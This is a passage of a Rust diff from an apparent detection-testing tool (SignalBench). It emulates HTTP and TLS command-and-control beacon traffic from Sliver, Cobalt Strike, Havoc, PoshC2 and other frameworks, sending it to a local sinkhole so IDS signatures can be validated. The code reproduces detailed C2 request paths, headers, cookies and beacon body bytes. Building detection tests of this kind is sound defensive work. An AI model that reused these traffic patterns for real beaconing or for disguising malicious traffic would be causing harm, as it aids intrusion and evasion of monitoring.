+                                            || l.contains("issuer")
+                                    })
+                                    .unwrap_or("(no cert info)");
+                                if ec == 0
+                                    || stdout.contains("CONNECTION ESTABLISHED")
+                                {
+                                    println!("CONNECTED");
+                                    writeln!(
+                                        log,
+                                        "PoshC2 TLS: CONNECTED ({})",
+                                        cert_line.trim()
+                                    )
+                                    .unwrap();
+                                    info!(
+                                        "[T1071-IOC-HTTP] PoshC2 TLS connected \
+                                         to {}: {}",
+                                        poshc2_tls_addr,
+                                        cert_line.trim()
+                                    );
+                                } else {
+                                    println!("ATTEMPTED (ec={})", ec);
+                                    writeln!(
+                                        log,
+                                        "PoshC2 TLS: ATTEMPTED (ec={}, {})",
+                                        ec,
+                                        cert_line.trim()
+                                    )
+                                    .unwrap();
+                                    info!(
+                                        "[T1071-IOC-HTTP] PoshC2 TLS attempted \
+                                         {}: ec={}",
+                                        poshc2_tls_addr,
+                                        ec
+                                    );
+                                }
+                            }
+                            Ok(Err(e)) => {
+                                println!("ERROR ({})", e);
+                                writeln!(log, "PoshC2 TLS: ERROR ({})", e)
+                                    .unwrap();
+                                debug!(
+                                    "[T1071-IOC-HTTP] PoshC2 TLS error at {}: \
+                                     {} (openssl not installed?)",
+                                    poshc2_tls_addr, e
+                                );
+                            }
+                            Err(_) => {
+                                println!("TIMEOUT");
+                                writeln!(log, "PoshC2 TLS: TIMEOUT").unwrap();
+                                debug!(
+                                    "[T1071-IOC-HTTP] PoshC2 TLS timeout at {}",
+                                    poshc2_tls_addr
+                                );
+                            }
+                        }
+                        sleep(Duration::from_secs(2)).await;
+                    } else if profile.domain == "signalbench-rat.xyz" {
+                        println!(
+                            "[T1071-IOC-HTTP]   Framework: {} (19-request Sliver session)",
+                            profile.framework
+                        );
+                        writeln!(
+                            log,
+                            "Mode: Sliver 19-request session (port 4444)"
+                        )
+                        .unwrap();
+                        let sliver_sessid =
+                            Uuid::new_v4().to_string().replace('-', "");
+                        let sliver_host = format!("Host: {}", profile.domain);
+                        let sliver_base =
+                            format!("http://{}:4444", sinkhole_ip);
+                        type SliverReq = (
+                            &'static str,
+                            &'static str,
+                            bool,
+                            bool,
+                            &'static str,
+                        );
+                        let sliver_reqs: &[SliverReq] = &[
+                            ("GET",  "/static/robots.txt",     false, true,  "sid:57675"),
+                            ("GET",  "/www/info.txt",          false, true,  "sid:57676"),
+                            ("GET",  "/docs/sample.txt",       false, true,  "sid:57682"),
+                            ("POST", "/app/login.jsp",         false, true,  "sid:57677"),
+                            ("POST", "/wordpress/login.php",   true,  true,  "sid:57678"),
+                            ("POST", "/api/api.php",           true,  true,  "sid:57679"),
+                            ("POST", "/rest/samples.php",      true,  true,  "sid:57680"),
+                            ("GET",  "/js/jquery.min.js",      true,  true,  "sid:57681"),
+                            ("GET",  "/fonts/glyphicons.woff", false, true,  "stager-woff"),
+                            ("GET",  "/static/keys.html",      false, true,  "keyexch-html"),
+                            ("GET",  "/img/spacer.png",        true,  true,  "close-png"),
+                            ("GET",  "/robots.txt",            false, false, "razy-hex"),
+                            ("GET",  "/info.txt",              false, false, "razy-hex"),
+                            ("GET",  "/sample.txt",            false, false, "razy-hex"),
+                            ("POST", "/wp/n.jsp",              false, false, "razy-hex"),
+                            ("POST", "/wp/in.php",             true,  false, "razy-hex"),
+                            ("POST", "/api.php",               true,  false, "razy-hex"),
+                            ("POST", "/wp/samples.php",        true,  false, "razy-hex"),
+                            ("GET",  "/js/app.min.js",         true,  false, "razy-hex"),
+                        ];
+                        let sliver_total = sliver_reqs.len();
+                        let mut sliver_any_ok = false;
+                        for (ri, &(method, path, with_sess, is_numeric, sid))
+                            in sliver_reqs.iter().enumerate()
+                        {
+                            let nonce = if is_numeric {
+                                use rand::Rng;
+                                rand::rng()
+                                    .random_range(1u32..=999_999_999)
+                                    .to_string()
+                            } else {
+                                Uuid::new_v4()
+                                    .to_string()
+                                    .replace('-', "")[..16]
+                                    .to_string()
+                            };
+                            let uri = format!(
+                                "{}{}?_={}",
+                                sliver_base, path, nonce
+                            );
+                            let mut sl_args: Vec<String> = vec![
+                                "-s".to_string(),
+                                "-o".to_string(),
+                                "/dev/null".to_string(),
+                                "-w".to_string(),
+                                "%{http_code},%{time_total},%{remote_ip}".to_string(),
+                                "--max-time".to_string(),
+                                timeout.to_string(),
+                                "--connect-timeout".to_string(),
+                                timeout.to_string(),
+                                "-X".to_string(),
+                                method.to_string(),
+                                "-A".to_string(),
+                                profile.user_agent.to_string(),
+                                "-H".to_string(),
+                                sliver_host.clone(),
+                                "-H".to_string(),
+                                "Accept-Language: en-US".to_string(),
+                            ];
+                            if with_sess {
+                                sl_args.push("-H".to_string());
+                                sl_args.push(format!(
+                                    "Cookie: PHPSESSID={}",
+                                    sliver_sessid
+                                ));
+                            }
+                            sl_args.push(uri);
+                            writeln!(
+                                log,
+                                "Sliver req {}/{} [{}]: {} {}",
+                                ri + 1, sliver_total, sid, method, path
+                            )
+                            .unwrap();
+                            match Command::new("curl").args(&sl_args).output().await {
+                                Ok(output) => {
+                                    let res =
+                                        String::from_utf8_lossy(&output.stdout);
+                                    let ec = output.status.code().unwrap_or(-1);
+                                    if is_fallback {
+                                        writeln!(
+                                            log,
+                                            "Sliver {}/{} [{}]: SENT (fallback)",
+                                            ri + 1, sliver_total, sid
+                                        )
+                                        .unwrap();
+                                    } else if ec == 0 {
+                                        if !sliver_any_ok {
+                                            successful_connections += 1;
+                                            sliver_any_ok = true;
+                                        }
+                                        writeln!(
+                                            log,
+                                            "Sliver {}/{} [{}]: SUCCESS ({})",
+                                            ri + 1, sliver_total, sid, res.trim()
+                                        )
+                                        .unwrap();
+                                    } else {
+                                        writeln!(
+                                            log,
+                                            "Sliver {}/{} [{}]: FAILED (ec={})",
+                                            ri + 1, sliver_total, sid, ec
+                                        )
+                                        .unwrap();
+                                    }
+                                }
+                                Err(e) => {
+                                    writeln!(
+                                        log,
+                                        "Sliver {}/{} [{}]: ERROR ({})",
+                                        ri + 1, sliver_total, sid, e
+                                    )
+                                    .unwrap();
+                                }
+                            }
+                        }
+                        if is_fallback {
+                            println!(
+                                "  [-->] Sliver {}-request sequence sent (fallback)",
+                                sliver_total
+                            );
+                        } else if sliver_any_ok {
+                            println!(
+                                "  [OK] Sliver {}-request sequence complete",
+                                sliver_total
+                            );
+                        } else {
+                            println!(
+                                "  [--] Sliver {}-request sequence failed",
+                                sliver_total
+                            );
+                        }
+                        sleep(Duration::from_secs(2)).await;
+                    } else if profile.domain == "signalbench-malware.ru" {
+                        println!(
+                            "[T1071-IOC-HTTP]   Framework: {} (6-pattern CS sequence)",
+                            profile.framework
+                        );
+                        writeln!(
+                            log,
+                            "Mode: Cobalt Strike 6-pattern sequence (port 4444)"
+                        )
+                        .unwrap();
+                        let cs_base = format!("http://{}:4444", sinkhole_ip);
+                        let cs_host = format!("Host: {}", profile.domain);
+                        let cs_uuid = Uuid::new_v4().to_string();
+                        let cs_b64_data = B64.encode(cs_uuid.as_bytes());
+                        let mut cs_any_ok = false;
+                        macro_rules! cs_curl {
+                            ($args:expr, $label:expr) => {{
+                                writeln!(
+                                    log,
+                                    "CS {}: curl {}",
+                                    $label,
+                                    $args.join(" ")
+                                )
+                                .unwrap();
+                                match Command::new("curl").args(&$args).output().await {
+                                    Ok(output) => {
+                                        let res =
+                                            String::from_utf8_lossy(&output.stdout);
+                                        let ec =
+                                            output.status.code().unwrap_or(-1);
+                                        if is_fallback {
+                                            writeln!(
+                                                log,
+                                                "CS {}: SENT (fallback)",
+                                                $label
+                                            )
+                                            .unwrap();
+                                        } else if ec == 0 {
+                                            if !cs_any_ok {
+                                                successful_connections += 1;
+                                                cs_any_ok = true;
+                                            }
+                                            writeln!(
+                                                log,
+                                                "CS {}: SUCCESS ({})",
+                                                $label,
+                                                res.trim()
+                                            )
+                                            .unwrap();
+                                        } else {
+                                            writeln!(
+                                                log,
+                                                "CS {}: FAILED (ec={})",
+                                                $label,
+                                                ec
+                                            )
+                                            .unwrap();
+                                        }
+                                    }
+                                    Err(e) => {
+                                        writeln!(
+                                            log,
+                                            "CS {}: ERROR ({})",
+                                            $label,
+                                            e
+                                        )
+                                        .unwrap();
+                                    }
+                                }
+                            }};
+                        }
+                        let cs1_args: Vec<String> = vec![
+                            "-s".to_string(), "-o".to_string(), "/dev/null".to_string(),
+                            "-w".to_string(), "%{http_code},%{time_total}".to_string(),
+                            "--max-time".to_string(), timeout.to_string(),
+                            "--connect-timeout".to_string(), timeout.to_string(),
+                            "-X".to_string(), "GET".to_string(),
+                            "-A".to_string(), profile.user_agent.to_string(),
+                            "-H".to_string(), cs_host.clone(),
+                            "-H".to_string(),
+                            "Cookie: auth_tokenAB01=ABCDEFGHIJKLMNOPQRSTUVWXYZABCDEF"
+                                .to_string(),
+                            format!("{}/get", cs_base),
+                        ];
+                        cs_curl!(cs1_args, "sid63772");
+                        let cs2_args: Vec<String> = vec![
+                            "-s".to_string(), "-o".to_string(), "/dev/null".to_string(),
+                            "-w".to_string(), "%{http_code},%{time_total}".to_string(),
+                            "--max-time".to_string(), timeout.to_string(),
+                            "--connect-timeout".to_string(), timeout.to_string(),
+                            "-X".to_string(), "GET".to_string(),
+                            "-A".to_string(),
+                            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) \
+                             AppleWebKit/537.36 (KHTML, like Gecko) \
+                             Chrome/88.0.4324.104 Safari/537.36".to_string(),
+                            "-H".to_string(), cs_host.clone(),
+                            "-H".to_string(), "Accept-Encoding:".to_string(),
+                            "-H".to_string(), "Accept-Language:".to_string(),
+                            format!("{}/oscp/beacon", cs_base),
+                        ];
+                        cs_curl!(cs2_args, "sid65446");
+                        let cs_submit_body: Vec<u8> = vec![
+                            0x04, 0x00, 0x00, 0x00, 0x41, 0x41, 0x41, 0x41,
+                        ];
+                        if let Some((args, _tf)) = tempfile::NamedTempFile::new()
+                            .ok()
+                            .and_then(|mut tf| {
+                                if tf.write_all(&cs_submit_body).is_ok() {
+                                    let p = tf.path().to_string_lossy().to_string();
+                                    let args: Vec<String> = vec![
+                                        "-s".to_string(), "-o".to_string(),
+                                        "/dev/null".to_string(),
+                                        "-w".to_string(),
+                                        "%{http_code},%{time_total}".to_string(),
+                                        "--max-time".to_string(), timeout.to_string(),
+                                        "--connect-timeout".to_string(),
+                                        timeout.to_string(),
+                                        "-X".to_string(), "POST".to_string(),
+                                        "-A".to_string(),
+                                        profile.user_agent.to_string(),
+                                        "-H".to_string(), cs_host.clone(),
+                                        "-H".to_string(),
+                                        "Content-Type: application/octet-stream"
+                                            .to_string(),
+                                        "-d".to_string(), format!("@{}", p),
+                                        format!("{}/submit.php?id=1", cs_base),
+                                    ];
+                                    Some((args, tf))
+                                } else {
+                                    None
+                                }
+                            })
+                        {
+                            cs_curl!(args, "sid300048");
+                        }
+                        let cs4_args: Vec<String> = vec![
+                            "-s".to_string(), "-o".to_string(), "/dev/null".to_string(),
+                            "-w".to_string(), "%{http_code},%{time_total}".to_string(),
+                            "--max-time".to_string(), timeout.to_string(),
+                            "--connect-timeout".to_string(), timeout.to_string(),
+                            "-X".to_string(), "GET".to_string(),
+                            "-A".to_string(), profile.user_agent.to_string(),
+                            "-H".to_string(), cs_host.clone(),
+                            format!("{}/mPlayer", cs_base),
+                        ];
+                        cs_curl!(cs4_args, "sid54175");
+                        let cs5_get_args: Vec<String> = vec![
+                            "-s".to_string(), "-o".to_string(), "/dev/null".to_string(),
+                            "-w".to_string(), "%{http_code},%{time_total}".to_string(),
+                            "--max-time".to_string(), timeout.to_string(),
+                            "--connect-timeout".to_string(), timeout.to_string(),
+                            "-X".to_string(), "GET".to_string(),
+                            "-A".to_string(), profile.user_agent.to_string(),
+                            "-H".to_string(), cs_host.clone(),
+                            format!("{}/compatible?id={}", cs_base, cs_uuid),
+                        ];
+                        cs_curl!(cs5_get_args, "sid54182-GET");
+                        let cs5_body =
+                            format!("data={}&from=0", cs_b64_data).into_bytes();
+                        if let Some((args, _tf)) = tempfile::NamedTempFile::new()
+                            .ok()
+                            .and_then(|mut tf| {
+                                if tf.write_all(&cs5_body).is_ok() {
+                                    let p = tf.path().to_string_lossy().to_string();
+                                    let args: Vec<String> = vec![
+                                        "-s".to_string(), "-o".to_string(),
+                                        "/dev/null".to_string(),
+                                        "-w".to_string(),
+                                        "%{http_code},%{time_total}".to_string(),
+                                        "--max-time".to_string(), timeout.to_string(),
+                                        "--connect-timeout".to_string(),
+                                        timeout.to_string(),
+                                        "-X".to_string(), "POST".to_string(),
+                                        "-A".to_string(),
+                                        profile.user_agent.to_string(),
+                                        "-H".to_string(), cs_host.clone(),
+                                        "-d".to_string(), format!("@{}", p),
+                                        format!(
+                                            "{}/compatible?id={}",
+                                            cs_base, cs_uuid
+                                        ),
+                                    ];
+                                    Some((args, tf))
+                                } else {
+                                    None
+                                }
+                            })
+                        {
+                            cs_curl!(args, "sid54182-POST");
+                        }
+                        let cs6_body = format!(
+                            "{{\"locale\":\"en\",\"channel\":\"prod\",\
+                              \"addon\":\"{}\",\"cli\":\"x\",\"l-monitor\":\"y\"}}",
+                            cs_uuid
+                        )
+                        .into_bytes();
+                        if let Some((args, _tf)) = tempfile::NamedTempFile::new()
+                            .ok()
+                            .and_then(|mut tf| {
+                                if tf.write_all(&cs6_body).is_ok() {
+                                    let p = tf.path().to_string_lossy().to_string();
+                                    let args: Vec<String> = vec![
+                                        "-s".to_string(), "-o".to_string(),
+                                        "/dev/null".to_string(),
+                                        "-w".to_string(),
+                                        "%{http_code},%{time_total}".to_string(),
+                                        "--max-time".to_string(), timeout.to_string(),
+                                        "--connect-timeout".to_string(),
+                                        timeout.to_string(),
+                                        "-X".to_string(), "POST".to_string(),
+                                        "-A".to_string(),
+                                        profile.user_agent.to_string(),
+                                        "-H".to_string(), cs_host.clone(),
+                                        "-H".to_string(),
+                                        "Content-Type: application/json".to_string(),
+                                        "-d".to_string(), format!("@{}", p),
+                                        format!("{}/track", cs_base),
+                                    ];
+                                    Some((args, tf))
+                                } else {
+                                    None
+                                }
+                            })
+                        {
+                            cs_curl!(args, "sid56616");
+                        }
+                        if is_fallback {
+                            println!(
+                                "  [-->] Cobalt Strike 6-pattern sequence sent (fallback)"
+                            );
+                        } else if cs_any_ok {
+                            println!(
+                                "  [OK] Cobalt Strike 6-pattern sequence complete"
+                            );
+                        } else {
+                            println!(
+                                "  [--] Cobalt Strike 6-pattern sequence failed"
+                            );
+                        }
+                        sleep(Duration::from_secs(2)).await;
+                    } else if profile.domain == "signalbench-havoc.cc" {
+                        println!(
+                            "[T1071-IOC-HTTP]   Framework: {} (3-request Havoc sequence)",
+                            profile.framework
+                        );
+                        writeln!(
+                            log,
+                            "Mode: Havoc 3-request sequence (port 4444)"
+                        )
+                        .unwrap();
+                        let havoc_base = format!("http://{}:4444", sinkhole_ip);
+                        let havoc_host = format!("Host: {}", profile.domain);
+                        let havoc_rand =
+                            Uuid::new_v4().to_string().replace('-', "");
+                        let mut havoc_any_ok = false;
+                        let hav1_args: Vec<String> = vec![
+                            "-s".to_string(), "-o".to_string(), "/dev/null".to_string(),
+                            "-w".to_string(), "%{http_code},%{time_total}".to_string(),
+                            "--max-time".to_string(), timeout.to_string(),
+                            "--connect-timeout".to_string(), timeout.to_string(),
+                            "-X".to_string(), "GET".to_string(),
+                            "-A".to_string(), profile.user_agent.to_string(),
+                            "-H".to_string(), havoc_host.clone(),
+                            "-H".to_string(), "Server: Apache".to_string(),
+                            format!(
+                                "{}/js/jquery-3.6.4.min.js?id={}&hash={}",
+                                havoc_base,
+                                &havoc_rand[..8],
+                                &havoc_rand[8..16]
+                            ),
+                        ];
+                        writeln!(log, "Havoc req 1/3: GET /js/jquery").unwrap();
+                        match Command::new("curl").args(&hav1_args).output().await {
+                            Ok(output) => {
+                                let ec = output.status.code().unwrap_or(-1);
+                                if is_fallback {
+                                    writeln!(log, "Havoc 1/3: SENT (fallback)").unwrap();
+                                } else if ec == 0 {
+                                    if !havoc_any_ok {
+                                        successful_connections += 1;
+                                        havoc_any_ok = true;
+                                    }
+                                    writeln!(log, "Havoc 1/3: SUCCESS").unwrap();
+                                } else {
+                                    writeln!(
+                                        log,
+                                        "Havoc 1/3: FAILED (ec={})",
+                                        ec
+                                    )
+                                    .unwrap();
+                                }
+                            }
+                            Err(e) => {
+                                writeln!(log, "Havoc 1/3: ERROR ({})", e).unwrap();
+                            }
+                        }
+                        let havoc_body_deadbeef: Vec<u8> = vec![
+                            0x00, 0x00, 0x00, 0x0C,
+                            0xDE, 0xAD, 0xBE, 0xEF,
+                            0x00, 0x00, 0x00, 0x20,
+                            0x00, 0x00, 0x00, 0x01,
+                        ];
+                        let havoc_body_b16b00b5: Vec<u8> = vec![
+                            0x00, 0x00, 0x00, 0x0C,
+                            0xB1, 0x6B, 0x00, 0xB5,
+                            0x00, 0x00, 0x00, 0x20,
+                            0x00, 0x00, 0x00, 0x01,
+                        ];
+                        if let Ok(mut tf) = tempfile::NamedTempFile::new() {
+                            if tf.write_all(&havoc_body_deadbeef).is_ok() {
+                                let p = tf.path().to_string_lossy().to_string();
+                                let hav2_args: Vec<String> = vec![
+                                    "-s".to_string(), "-o".to_string(),
+                                    "/dev/null".to_string(),
+                                    "-w".to_string(),
+                                    "%{http_code},%{time_total}".to_string(),
+                                    "--max-time".to_string(), timeout.to_string(),
+                                    "--connect-timeout".to_string(),
+                                    timeout.to_string(),
+                                    "-X".to_string(), "POST".to_string(),
+                                    "-A".to_string(), profile.user_agent.to_string(),
+                                    "-H".to_string(), havoc_host.clone(),
+                                    "-H".to_string(),
+                                    "Content-Type: application/octet-stream".to_string(),
+                                    "-d".to_string(), format!("@{}", p),
+                                    format!(
+                                        "{}/Collectors/3.0/settings/mail/",
+                                        havoc_base
+                                    ),
+                                ];
+                                writeln!(
+                                    log,
+                                    "Havoc req 2/3: POST /Collectors/ (DEADBEEF)"
+                                )
+                                .unwrap();
+                                match Command::new("curl")
+                                    .args(&hav2_args)
+                                    .output()
+                                    .await
+                                {
+                                    Ok(output) => {
+                                        let ec = output.status.code().unwrap_or(-1);
+                                        if is_fallback {
+                                            writeln!(
+                                                log,
+                                                "Havoc 2/3: SENT (fallback)"
+                                            )
+                                            .unwrap();
+                                        } else if ec == 0 {
+                                            if !havoc_any_ok {
+                                                successful_connections += 1;
+                                                havoc_any_ok = true;
+                                            }
+                                            writeln!(log, "Havoc 2/3: SUCCESS").unwrap();
+                                        } else {
+                                            writeln!(
+                                                log,
+                                                "Havoc 2/3: FAILED (ec={})",
+                                                ec
+                                            )
+                                            .unwrap();
+                                        }
+                                    }
+                                    Err(e) => {
+                                        writeln!(log, "Havoc 2/3: ERROR ({})", e)
+                                            .unwrap();
+                                    }
+                                }
+                                drop(tf);
+                            }
+                        }
+                        if let Ok(mut tf) = tempfile::NamedTempFile::new() {
+                            if tf.write_all(&havoc_body_b16b00b5).is_ok() {
+                                let p = tf.path().to_string_lossy().to_string();
+                                let hav3_args: Vec<String> = vec![
+                                    "-s".to_string(), "-o".to_string(),
+                                    "/dev/null".to_string(),
+                                    "-w".to_string(),
+                                    "%{http_code},%{time_total}".to_string(),
+                                    "--max-time".to_string(), timeout.to_string(),
+                                    "--connect-timeout".to_string(),
+                                    timeout.to_string(),
+                                    "-X".to_string(), "POST".to_string(),
+                                    "-A".to_string(), profile.user_agent.to_string(),
+                                    "-H".to_string(), havoc_host.clone(),
+                                    "-H".to_string(),
+                                    "Content-Type: application/octet-stream".to_string(),
+                                    "-d".to_string(), format!("@{}", p),
+                                    format!(
+                                        "{}/Collectors/3.0/events/mail/",
+                                        havoc_base
+                                    ),
+                                ];
+                                writeln!(
+                                    log,
+                                    "Havoc req 3/3: POST /Collectors/ (B16B00B5)"
+                                )
+                                .unwrap();
+                                match Command::new("curl")
+                                    .args(&hav3_args)
+                                    .output()
+                                    .await
+                                {
+                                    Ok(output) => {
+                                        let ec = output.status.code().unwrap_or(-1);
+                                        if is_fallback {
+                                            writeln!(
+                                                log,
+                                                "Havoc 3/3: SENT (fallback)"
+                                            )
+                                            .unwrap();
+                                        } else if ec == 0 {
+                                            if !havoc_any_ok {
+                                                successful_connections += 1;
+                                                havoc_any_ok = true;
+                                            }
+                                            writeln!(log, "Havoc 3/3: SUCCESS").unwrap();
+                                        } else {
+                                            writeln!(
+                                                log,
+                                                "Havoc 3/3: FAILED (ec={})",
+                                                ec
+                                            )
+                                            .unwrap();
+                                        }
+                                    }
+                                    Err(e) => {
+                                        writeln!(log, "Havoc 3/3: ERROR ({})", e)
+                                            .unwrap();
+                                    }
+                                }
+                                drop(tf);
+                            }
+                        }
+                        if is_fallback {
+                            println!(
+                                "  [-->] Havoc 3-request sequence sent (fallback)"
+                            );
+                        } else if havoc_any_ok {
+                            println!("  [OK] Havoc 3-request sequence complete");
+                        } else {
+                            println!("  [--] Havoc 3-request sequence failed");
+                        }
+                        sleep(Duration::from_secs(2)).await;
+                    } else {
+                        // Standard C2 framework profile (AdaptixC2, Empire, Mythic, etc.)
+                        println!(
+                            "[T1071-IOC-HTTP]   Framework: {} (C2 profile, port 4444)",
+                            profile.framework
+                        );
+                        writeln!(
+                            log,
+                            "Mode: C2 profile (port 4444 primary, port 80 follow-up)"
+                        )
+                        .unwrap();
+                        let primary_url = format!(
+                            "http://{}:4444{}",
+                            sinkhole_ip, profile.uri
+                        );
+                        let mut primary_args: Vec<String> = vec![
+                            "-s".to_string(),
+                            "-o".to_string(),
+                            "/dev/null".to_string(),
+                            "-w".to_string(),
+                            "%{http_code},%{time_total},%{remote_ip}".to_string(),
+                            "--max-time".to_string(),
+                            timeout.to_string(),
+                            "--connect-timeout".to_string(),
+                            timeout.to_string(),
+                            "-A".to_string(),
+                            profile.user_agent.to_string(),
+                            "-X".to_string(),
+                            profile.method.to_string(),
+                            "-H".to_string(),
+                            format!("Host: {}", profile.domain),
+                        ];
+                        for hdr in &profile.extra_headers {
+                            primary_args.push("-H".to_string());
+                            primary_args.push(hdr.clone());
+                        }
+                        let primary_body_tf: Option<tempfile::NamedTempFile>;
+                        if let Some(body_bytes) = &profile.body {
+                            match tempfile::NamedTempFile::new() {
+                                Ok(mut tf) => {
+                                    if tf.write_all(body_bytes).is_ok() {
+                                        let path =
+                                            tf.path().to_string_lossy().to_string();
+                                        primary_args.push("-d".to_string());
+                                        primary_args
+                                            .push(format!("@{}", path));
+                                        primary_body_tf = Some(tf);
+                                    } else {
+                                        primary_body_tf = None;
+                                    }
+                                }
+                                Err(_) => {
+                                    primary_body_tf = None;
+                                }
+                            }
+                        } else {
+                            primary_body_tf = None;
+                        }
+                        primary_args.push(primary_url);
+                        writeln!(
+                            log,
+                            "Primary curl: curl {}",
+                            primary_args.join(" ")
+                        )
+                        .unwrap();
+                        match Command::new("curl").args(&primary_args).output().await {
+                            Ok(output) => {
+                                let result =
+                                    String::from_utf8_lossy(&output.stdout);
+                                let exit_code =
+                                    output.status.code().unwrap_or(-1);
+                                if is_fallback {
+                                    println!("  [-->] Sent (fallback unidirectional)");
+                                    writeln!(
+                                        log,
+                                        "Primary status: SENT (fallback)"
+                                    )
+                                    .unwrap();
+                                } else if exit_code == 0 {
+                                    successful_connections += 1;
+                                    println!(
+                                        "  [OK] Response: {}",
+                                        result.trim()
+                                    );
+                                    writeln!(log, "Primary status: SUCCESS").unwrap();
+                                } else {
+                                    println!(
+                                        "  [--] Failed (exit code: {})",
+                                        exit_code
+                                    );
+                                    writeln!(
+                                        log,
+                                        "Primary status: FAILED (ec={})",
+                                        exit_code
+                                    )
+                                    .unwrap();
+                                }
+                            }
+                            Err(e) => {
+                                println!("  [FAIL] Error: {}", e);
+                                writeln!(log, "Primary status: ERROR ({})", e).unwrap();
+                            }
+                        }
+                        drop(primary_body_tf);
+                        if let (Some(followup_uri), Some(followup_method)) =
+                            (&profile.followup_uri, profile.followup_method)
+                        {
+                            let followup_url = format!(
+                                "http://{}:80{}",
+                                sinkhole_ip, followup_uri
+                            );
+                            let mut followup_args: Vec<String> = vec![
+                                "-s".to_string(),
+                                "-o".to_string(),
+                                "/dev/null".to_string(),
+                                "-w".to_string(),
+                                "%{http_code},%{time_total},%{remote_ip}".to_string(),
+                                "--max-time".to_string(),
+                                timeout.to_string(),
+                                "--connect-timeout".to_string(),
+                                timeout.to_string(),
+                                "-A".to_string(),
+                                profile.user_agent.to_string(),
+                                "-X".to_string(),
+                                followup_method.to_string(),
+                                "-H".to_string(),
+                                format!("Host: {}", profile.domain),
+                            ];
+                            for hdr in &profile.followup_extra_headers {
+                                followup_args.push("-H".to_string());
+                                followup_args.push(hdr.clone());
+                            }
+                            let followup_body_tf: Option<tempfile::NamedTempFile>;
+                            if let Some(body_bytes) = &profile.followup_body {
+                                match tempfile::NamedTempFile::new() {
+                                    Ok(mut tf) => {
+                                        if tf.write_all(body_bytes).is_ok() {
+                                            let path =
+                                                tf.path().to_string_lossy().to_string();
+                                            followup_args.push("-d".to_string());
+                                            followup_args
+                                                .push(format!("@{}", path));
+                                            followup_body_tf = Some(tf);
+                                        } else {
+                                            followup_body_tf = None;
+                                        }
+                                    }
+                                    Err(_) => {
+                                        followup_body_tf = None;
+                                    }
+                                }
+                            } else {
+                                followup_body_tf = None;
+                            }
+                            followup_args.push(followup_url);
+                            writeln!(
+                                log,
+                                "Follow-up curl: curl {}",
+                                followup_args.join(" ")
+                            )
+                            .unwrap();
+                            match Command::new("curl")
+                                .args(&followup_args)
+                                .output()
+                                .await
+                            {
+                                Ok(output) => {
+                                    let exit_code =
+                                        output.status.code().unwrap_or(-1);
+                                    if is_fallback {
+                                        writeln!(
+                                            log,
+                                            "Follow-up status: SENT (fallback)"
+                                        )
+                                        .unwrap();
+                                    } else if exit_code == 0 {
+                                        writeln!(
+                                            log,
+                                            "Follow-up status: SUCCESS"
+                                        )
+                                        .unwrap();
+                                    } else {
+                                        writeln!(
+                                            log,
+                                            "Follow-up status: FAILED (ec={})",
+                                            exit_code
+                                        )
+                                        .unwrap();
+                                    }
+                                }
+                                Err(e) => {
+                                    writeln!(
+                                        log,
+                                        "Follow-up status: ERROR ({})",
+                                        e
+                                    )
+                                    .unwrap();
+                                }
+                            }
+                            drop(followup_body_tf);
+                        }
+                    }
+                } else {
+                    // Plain curl for DGA, IP, Tor-proxy, mining-pool domains without profile
+                    let curl_result = Command::new("curl")
+                        .args([
+                            "-s", "-o", "/dev/null",
+                            "-w", "%{http_code},%{time_total},%{remote_ip}",
+                            "--max-time", &timeout.to_string(),
+                            "--connect-timeout", &timeout.to_string(),
+                            &format!("http://{}", domain),
+                        ])
+                        .output()
+                        .await;
+                    match curl_result {
+                        Ok(output) => {
+                            let result = String::from_utf8_lossy(&output.stdout);
+                            let exit_code = output.status.code().unwrap_or(-1);
+                            if exit_code == 0 {
+                                successful_connections += 1;
+                                println!("  [OK] Response: {}", result.trim());
+                                writeln!(log, "Status: SUCCESS").unwrap();
+                            } else {
+                                println!(
+                                    "  [--] Failed (exit code: {})",
+                                    exit_code
+                                );
+                                writeln!(
+                                    log,
+                                    "Status: FAILED (ec={})",
+                                    exit_code
+                                )
+                                .unwrap();
+                            }
+                        }
+                        Err(e) => {
+                            println!("  [FAIL] Error: {}", e);
+                            writeln!(log, "Status: ERROR ({})", e).unwrap();
+                        }
+                    }
+                }
+
+                // DNS lookup for additional telemetry (all domains)
+                if dig_available {
+                    let dig_result = Command::new("dig")
+                        .args(["+short", "+time=1", "+tries=1", domain])
+                        .output()
+                        .await;
+                    if let Ok(output) = dig_result {
+                        let dns_result = String::from_utf8_lossy(&output.stdout);
+                        if !dns_result.trim().is_empty() {
+                            writeln!(log, "DNS: {}", dns_result.trim()).unwrap();
+                        } else {
+                            writeln!(log, "DNS: No resolution").unwrap();
+                        }
+                    }
+                } else {
+                    match tokio::net::lookup_host(format!("{domain}:0")).await {
+                        Ok(addrs) => {
+                            let ips: Vec<String> =
+                                addrs.map(|a| a.ip().to_string()).collect();
+                            if ips.is_empty() {
+                                writeln!(
+                                    log,
+                                    "DNS: No resolution (native resolver)"
+                                )
+                                .unwrap();
+                            } else {
+                                writeln!(
+                                    log,
+                                    "DNS: {} (native resolver)",
+                                    ips.join(" ")
+                                )
+                                .unwrap();
+                            }
+                        }
+                        Err(e) => {
+                            writeln!(
+                                log,
+                                "DNS: lookup failed (native resolver): {e}"
+                            )
+                            .unwrap();
+                        }
+                    }
+                }
+                writeln!(log).unwrap();
+            }
+
+            print_skipped_domains_warning(&skipped_domains, &sinkhole_ip);
+
+            println!("\n{}", "-".repeat(60));
+            println!(
+                "[T1071-IOC-HTTP] Summary: {} domain connections ({} ok, {} failed, {} skipped)",
+                connection_count,
+                successful_connections,
+                connection_count - successful_connections,
+                skipped_count
+            );
+            println!("{}", "-".repeat(60));
+
+            info!(
+                "[T1071-IOC-HTTP] Complete: {} connections ({} ok, {} skipped)",
+                connection_count, successful_connections, skipped_count
+            );
+
+            let mut artifacts = vec![log_file.clone()];
+            if hosts_modified {
+                artifacts.push(HOSTS_ARTIFACT_MARKER.to_string());
+            }
+
+            Ok(SimulationResult {
+                technique_id: "T1071-IOC-HTTP".to_string(),
+                success: true,
+                message: format!(
+                    "HTTP C2 framework profiling: {} domain connections ({} ok, {} failed, {} skipped)",
+                    connection_count,
+                    successful_connections,
+                    connection_count - successful_connections,
+                    skipped_count
+                ),
+                artifacts,
+                cleanup_required: true,
+            })
+        })
+    }
+
+    fn cleanup<'a>(&'a self, artifacts: &'a [String]) -> CleanupFuture<'a> {
+        Box::pin(async move {
+            debug!("[T1071-IOC-HTTP] Starting cleanup");
+            if artifacts.contains(&HOSTS_ARTIFACT_MARKER.to_string()) {
+                if is_running_as_root() {
+                    match remove_hosts_entries() {
+                        Ok(()) => {
+                            info!("[T1071-IOC-HTTP] Cleaned up /etc/hosts entries");
+                        }
